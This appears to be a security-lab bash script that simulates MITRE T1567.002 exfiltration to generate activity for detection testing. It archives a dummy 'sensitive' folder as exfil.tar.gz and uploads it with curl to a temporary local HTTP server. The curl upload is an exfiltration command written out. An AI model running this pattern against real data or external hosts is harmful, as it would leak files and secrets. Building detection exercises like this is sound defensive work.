#!/usr/bin/env bash
# SecLab 剧本：在采集窗口内执行（collect.sh 已 cd 到工作区）。载荷无害。
set -euo pipefail
HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)"
# T1567.002：归档外传至"外部存储"（实验室本机模拟端点，不在批准清单）
mkdir -p sensitive; echo "records" > sensitive/records.csv
tar czf exfil.tar.gz sensitive
python3 -m http.server 18081 >/dev/null 2>&1 &
SRV=$!; sleep 0.5
curl -sf -F "f=@exfil.tar.gz" http://127.0.0.1:18081/ >/dev/null || true
kill $SRV 2>/dev/null || true
